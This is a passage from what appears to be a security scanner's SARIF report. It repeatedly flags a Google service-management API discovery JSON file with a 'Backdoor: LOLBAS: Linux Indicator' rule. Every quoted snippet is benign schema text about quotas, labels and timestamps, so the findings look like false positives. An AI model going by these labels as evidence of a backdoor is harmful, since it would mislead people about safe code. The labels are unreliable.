                  "startLine": 2265,
                  "startColumn": 29,
                  "endLine": 2265,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfig\": {\n          \"description\": \"The service configuration. Not set if errors occured during conversion.\",\n          \"$ref\": \"Service\"\n        },\n        \"diagnostics\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfig\": {\n          \"description\": \"The service configuration. Not set if errors occured during conversion.\",\n          \"$ref\": \"Service\"\n        },\n        \"diagnostics\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfig\": {\n          \"description\": \"The service configuration. Not set if errors occured during conversion.\",\n          \"$ref\": \"Service\"\n        },\n        \"diagnostics\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2217,
                  "startColumn": 29,
                  "endLine": 2217,
                  "endColumn": 38,
                  "snippet": {
                    "text": "          \"$ref\": \"OpenApiSpec\"\n        },\n        \"serviceName\": {\n          \"description\": \"The service name to use for constructing the normalized service\\nconfiguration equivalent of the provided configuration specification.\",\n          \"type\": \"string\"\n        },\n        \"configSpec\": {\n",
                    "rendered": {
                      "text": "          \"$ref\": \"OpenApiSpec\"\n        },\n        \"serviceName\": {\n          \"description\": \"The service name to use for constructing the normalized service\\nconfiguration equivalent of the provided configuration specification.\",\n          \"type\": \"string\"\n        },\n        \"configSpec\": {\n",
                      "markdown": "`          \"$ref\": \"OpenApiSpec\"\n        },\n        \"serviceName\": {\n          \"description\": \"The service name to use for constructing the normalized service\\nconfiguration equivalent of the provided configuration specification.\",\n          \"type\": \"string\"\n        },\n        \"configSpec\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2176,
                  "startColumn": 37,
                  "endLine": 2176,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfigs\": {\n          \"description\": \"The list of service config resources.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Service\"\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfigs\": {\n          \"description\": \"The list of service config resources.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Service\"\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"serviceConfigs\": {\n          \"description\": \"The list of service config resources.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Service\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2162,
                  "startColumn": 468,
                  "endLine": 2162,
                  "endColumn": 477,
                  "snippet": {
                    "text": "nion of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },\n    \"ListServiceConfigsResponse\": {\n      \"id\": \"ListServiceConfigsResponse\",\n      \"description\": \"Response message for ListServiceCon",
                    "rendered": {
                      "text": "nion of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },\n    \"ListServiceConfigsResponse\": {\n      \"id\": \"ListServiceConfigsResponse\",\n      \"description\": \"Response message for ListServiceCon",
                      "markdown": "`nion of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          }\n        }\n      }\n    },\n    \"ListServiceConfigsResponse\": {\n      \"id\": \"ListServiceConfigsResponse\",\n      \"description\": \"Response message for ListServiceCon`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2162,
                  "startColumn": 295,
                  "endLine": 2162,
                  "endColumn": 304,
                  "snippet": {
                    "text": "\": {\n          \"description\": \"The set of visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"",
                    "rendered": {
                      "text": "\": {\n          \"description\": \"The set of visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"",
                      "markdown": "`\": {\n          \"description\": \"The set of visibility labels that are used to determine what API surface is\\nvisible to calls made by this project. The visible surface is a union of\\nthe surface features associated with each label listed here, plus the\\npublicly visible (unrestricted) surface.\\n\\nThe service producer may add or remove labels at any time. The service\\nconsumer may add a label if the calling user has been granted permission\\nto do so by the producer.  The service consumer may also remove any label\\nat any time.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2158,
                  "startColumn": 65,
                  "endLine": 2158,
                  "endColumn": 74,
                  "snippet": {
                    "text": "    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n",
                    "rendered": {
                      "text": "    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n",
                      "markdown": "`    },\n    \"VisibilitySettings\": {\n      \"id\": \"VisibilitySettings\",\n      \"description\": \"Settings that control which features of the service are visible to the\\nconsumer project.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"visibilityLabels\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2150,
                  "startColumn": 113,
                  "endLine": 2150,
                  "endColumn": 122,
                  "snippet": {
                    "text": "          \"format\": \"int64\"\n        },\n        \"effectiveLimit\": {\n          \"description\": \"The effective limit value, based on the stored producer and consumer\\noverrides and the service defaults.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        }\n",
                    "rendered": {
                      "text": "          \"format\": \"int64\"\n        },\n        \"effectiveLimit\": {\n          \"description\": \"The effective limit value, based on the stored producer and consumer\\noverrides and the service defaults.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        }\n",
                      "markdown": "`          \"format\": \"int64\"\n        },\n        \"effectiveLimit\": {\n          \"description\": \"The effective limit value, based on the stored producer and consumer\\noverrides and the service defaults.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2133,
                  "startColumn": 107,
                  "endLine": 2133,
                  "endColumn": 116,
                  "snippet": {
                    "text": "    },\n    \"EffectiveQuotaLimit\": {\n      \"id\": \"EffectiveQuotaLimit\",\n      \"description\": \"An effective quota limit contains the metadata for a quota limit\\nas derived from the service config, together with fields that describe\\nthe effective limit value and what overrides can be applied to it.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseLimit\": {\n",
                    "rendered": {
                      "text": "    },\n    \"EffectiveQuotaLimit\": {\n      \"id\": \"EffectiveQuotaLimit\",\n      \"description\": \"An effective quota limit contains the metadata for a quota limit\\nas derived from the service config, together with fields that describe\\nthe effective limit value and what overrides can be applied to it.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseLimit\": {\n",
                      "markdown": "`    },\n    \"EffectiveQuotaLimit\": {\n      \"id\": \"EffectiveQuotaLimit\",\n      \"description\": \"An effective quota limit contains the metadata for a quota limit\\nas derived from the service config, together with fields that describe\\nthe effective limit value and what overrides can be applied to it.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseLimit\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2081,
                  "startColumn": 29,
                  "endLine": 2081,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n          \"description\": \"The service configuration for this quota group, minus the quota limits,\\nwhich are replaced by the effective limits below.\",\n          \"$ref\": \"QuotaGroup\"\n        },\n        \"billingInteraction\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n          \"description\": \"The service configuration for this quota group, minus the quota limits,\\nwhich are replaced by the effective limits below.\",\n          \"$ref\": \"QuotaGroup\"\n        },\n        \"billingInteraction\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n          \"description\": \"The service configuration for this quota group, minus the quota limits,\\nwhich are replaced by the effective limits below.\",\n          \"$ref\": \"QuotaGroup\"\n        },\n        \"billingInteraction\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2077,
                  "startColumn": 112,
                  "endLine": 2077,
                  "endColumn": 121,
                  "snippet": {
                    "text": "    },\n    \"EffectiveQuotaGroup\": {\n      \"id\": \"EffectiveQuotaGroup\",\n      \"description\": \"An effective quota group contains both the metadata for a quota group\\nas derived from the service config, and the effective limits in that\\ngroup as calculated from producer and consumer overrides together with\\nservice defaults.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n",
                    "rendered": {
                      "text": "    },\n    \"EffectiveQuotaGroup\": {\n      \"id\": \"EffectiveQuotaGroup\",\n      \"description\": \"An effective quota group contains both the metadata for a quota group\\nas derived from the service config, and the effective limits in that\\ngroup as calculated from producer and consumer overrides together with\\nservice defaults.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n",
                      "markdown": "`    },\n    \"EffectiveQuotaGroup\": {\n      \"id\": \"EffectiveQuotaGroup\",\n      \"description\": \"An effective quota group contains both the metadata for a quota group\\nas derived from the service config, and the effective limits in that\\ngroup as calculated from producer and consumer overrides together with\\nservice defaults.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"baseGroup\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2069,
                  "startColumn": 29,
                  "endLine": 2069,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          \"format\": \"google-datetime\"\n        },\n        \"queryTime\": {\n          \"description\": \"The time the quota usage data was queried.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n",
                    "rendered": {
                      "text": "          \"format\": \"google-datetime\"\n        },\n        \"queryTime\": {\n          \"description\": \"The time the quota usage data was queried.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n",
                      "markdown": "`          \"format\": \"google-datetime\"\n        },\n        \"queryTime\": {\n          \"description\": \"The time the quota usage data was queried.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2064,
                  "startColumn": 29,
                  "endLine": 2064,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          \"format\": \"google-datetime\"\n        },\n        \"endTime\": {\n          \"description\": \"The time the quota duration ended.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n",
                    "rendered": {
                      "text": "          \"format\": \"google-datetime\"\n        },\n        \"endTime\": {\n          \"description\": \"The time the quota duration ended.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n",
                      "markdown": "`          \"format\": \"google-datetime\"\n        },\n        \"endTime\": {\n          \"description\": \"The time the quota duration ended.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2059,
                  "startColumn": 29,
                  "endLine": 2059,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          \"format\": \"int64\"\n        },\n        \"startTime\": {\n          \"description\": \"The time the quota duration started.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n",
                    "rendered": {
                      "text": "          \"format\": \"int64\"\n        },\n        \"startTime\": {\n          \"description\": \"The time the quota duration started.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n",
                      "markdown": "`          \"format\": \"int64\"\n        },\n        \"startTime\": {\n          \"description\": \"The time the quota duration started.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2013,
                  "startColumn": 331,
                  "endLine": 2013,
                  "endColumn": 337,
                  "snippet": {
                    "text": "    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n",
                      "markdown": "`    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2013,
                  "startColumn": 115,
                  "endLine": 2013,
                  "endColumn": 121,
                  "snippet": {
                    "text": "    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n",
                      "markdown": "`    },\n    \"VariableTermQuota\": {\n      \"id\": \"VariableTermQuota\",\n      \"description\": \"A variable term quota is a bucket of tokens that is consumed over a\\nspecified (usually long) time period. When present, it overrides any\\n\\\"1d\\\" duration per-project quota specified on the group.\\n\\nVariable terms run from midnight to midnight, start_date to end_date\\n(inclusive) in the America\\/Los_Angeles time zone.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"groupName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1987,
                  "startColumn": 95,
                  "endLine": 1987,
                  "endColumn": 104,
                  "snippet": {
                    "text": "          }\n        },\n        \"effectiveQuotaGroups\": {\n          \"description\": \"Use this field for quota limits defined under quota groups.\\nCombines service quota configuration and project-specific settings, as\\na map from quota group name to the effective quota information for that\\ngroup.\\nOutput-only.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"EffectiveQuotaGroup\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"effectiveQuotaGroups\": {\n          \"description\": \"Use this field for quota limits defined under quota groups.\\nCombines service quota configuration and project-specific settings, as\\na map from quota group name to the effective quota information for that\\ngroup.\\nOutput-only.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"EffectiveQuotaGroup\"\n",
                      "markdown": "`          }\n        },\n        \"effectiveQuotaGroups\": {\n          \"description\": \"Use this field for quota limits defined under quota groups.\\nCombines service quota configuration and project-specific settings, as\\na map from quota group name to the effective quota information for that\\ngroup.\\nOutput-only.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"EffectiveQuotaGroup\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1980,
                  "startColumn": 65,
                  "endLine": 1980,
                  "endColumn": 71,
                  "snippet": {
                    "text": "          }\n        },\n        \"variableTermQuotas\": {\n          \"description\": \"Quotas that are active over a specified time period. Only writeable\\nby the producer.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VariableTermQuota\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"variableTermQuotas\": {\n          \"description\": \"Quotas that are active over a specified time period. Only writeable\\nby the producer.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VariableTermQuota\"\n",
                      "markdown": "`          }\n        },\n        \"variableTermQuotas\": {\n          \"description\": \"Quotas that are active over a specified time period. Only writeable\\nby the producer.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"VariableTermQuota\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1973,
                  "startColumn": 279,
                  "endLine": 1973,
                  "endColumn": 288,
                  "snippet": {
                    "text": "          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the service\\ndefaults together with any producer or consumer overrides.\\nFor each limit, the effective value is the minimum of the producer\\nand consumer overrides if either is present, or else the service default\\nif neither is present.\\nDEPRECATED. Use effective_quota_groups instead.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the service\\ndefaults together with any producer or consumer overrides.\\nFor each limit, the effective value is the minimum of the producer\\nand consumer overrides if either is present, or else the service default\\nif neither is present.\\nDEPRECATED. Use effective_quota_groups instead.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n",
                      "markdown": "`          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the service\\ndefaults together with any producer or consumer overrides.\\nFor each limit, the effective value is the minimum of the producer\\nand consumer overrides if either is present, or else the service default\\nif neither is present.\\nDEPRECATED. Use effective_quota_groups instead.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1966,
                  "startColumn": 644,
                  "endLine": 1966,
                  "endColumn": 653,
                  "snippet": {
                    "text": "ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the s",
                    "rendered": {
                      "text": "ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the s",
                      "markdown": "`ROUP_NAME is the google.api.QuotaGroup.name field and\\nLIMIT_NAME is the google.api.QuotaLimit.name field from the service\\nconfig.  For example: 'ReadGroup\\/ProjectDaily'.\\n\\n- '<LIMIT_NAME>' for quotas defined without quota groups, where LIMIT_NAME\\nis the google.api.QuotaLimit.name field from the service config. For\\nexample: 'borrowedCountPerOrganization'.\",\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"QuotaLimitOverride\"\n          }\n        },\n        \"effectiveQuotas\": {\n          \"description\": \"The effective quota limits for each group, derived from the s`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
